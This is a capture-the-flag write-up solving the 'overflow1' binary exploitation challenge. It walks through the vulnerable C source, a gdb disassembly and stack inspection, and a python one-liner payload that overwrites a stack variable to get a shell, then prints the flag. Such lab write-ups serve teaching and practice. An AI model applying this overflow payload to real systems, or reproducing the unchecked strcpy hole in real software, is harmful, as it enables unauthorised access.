### Solved by et0x

Overflow1 is a 50 point binary exploitation challenge.


> This problem has a buffer overflow vulnerability! Can you get a shell, then use that shell to read flag.txt? You can solve this problem interactively here, and the source can be found here.

The source for the binary is the following:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void give_shell(){
    gid_t gid = getegid();
    setresgid(gid, gid, gid);
    system("/bin/sh -i");
}

void vuln(char *input){
    char buf[16];
    int secret = 0;
    strcpy(buf, input);

    if (secret == 0xc0deface){
        give_shell();
    }else{
        printf("The secret is %x\n", secret);
    }
}

int main(int argc, char **argv){
    if (argc > 1)
        vuln(argv[1]);
    return 0;
}

```

So the goal here is to fill the "buf" array with 16 characters, and overflow the next four bytes with "0xc0deface" so that we execute the give_shell() function.  This should be easy enough, lets look at it in gdb.

First, lets disassemble the "vuln" function.

```bash
(gdb) disass vuln
Dump of assembler code for function vuln:
   0x08048512 <+0>:	push   %ebp
   0x08048513 <+1>:	mov    %esp,%ebp
   0x08048515 <+3>:	sub    $0x38,%esp
   0x08048518 <+6>:	movl   $0x0,-0xc(%ebp)
   0x0804851f <+13>:	mov    0x8(%ebp),%eax
   0x08048522 <+16>:	mov    %eax,0x4(%esp)
   0x08048526 <+20>:	lea    -0x1c(%ebp),%eax
   0x08048529 <+23>:	mov    %eax,(%esp)
   0x0804852c <+26>:	call   0x8048390 <strcpy@plt>
   0x08048531 <+31>:	cmpl   $0xc0deface,-0xc(%ebp)
   0x08048538 <+38>:	jne    0x8048541 <vuln+47>
   0x0804853a <+40>:	call   0x80484dd <give_shell>
   0x0804853f <+45>:	jmp    0x8048554 <vuln+66>
   0x08048541 <+47>:	mov    -0xc(%ebp),%eax
   0x08048544 <+50>:	mov    %eax,0x4(%esp)
   0x08048548 <+54>:	movl   $0x804861b,(%esp)
   0x0804854f <+61>:	call   0x8048370 <printf@plt>
   0x08048554 <+66>:	leave  
   0x08048555 <+67>:	ret
```

Let's place a breakpoing at 0x08048531 so that we can see whats on the stack, and view the data as the "cmpl" instruction sees it.

```
(gdb) b * 0x08048531
Breakpoint 1 at 0x8048531
(gdb) run AAAAAAAAAAAAAAAA
Starting program: /home/overflow1/overflow1 AAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048531 in vuln ()

(gdb) x/20xb $ebp-0xc-16
0xffffd6cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd6d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd6dc:	0x00	0x00	0x00	0x00
```
And now, with more than 16 bytes...

```
0xffffd6cc:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd6d4:	0x41	0x41	0x41	0x41	0x41	0x41	0x41	0x41
0xffffd6dc:	0x41	0x41	0x41	0x41
```

So now we see that we can overflow the buffer.  Let's fill the last four bytes (secret) with 0xc0deface. Remember to put the bytes in little-endian order.

```bash
pico1139@shell:/home/overflow1$ ./overflow1 $(python -c 'print "A"*16+"\xce\xfa\xde\xc0"')
$ id
uid=11066(pico1139) gid=1002(overflow1) groups=1017(picogroup)
$ cat flag.txt
ooh_so_critical
```

So the flag is **ooh_so_critical**

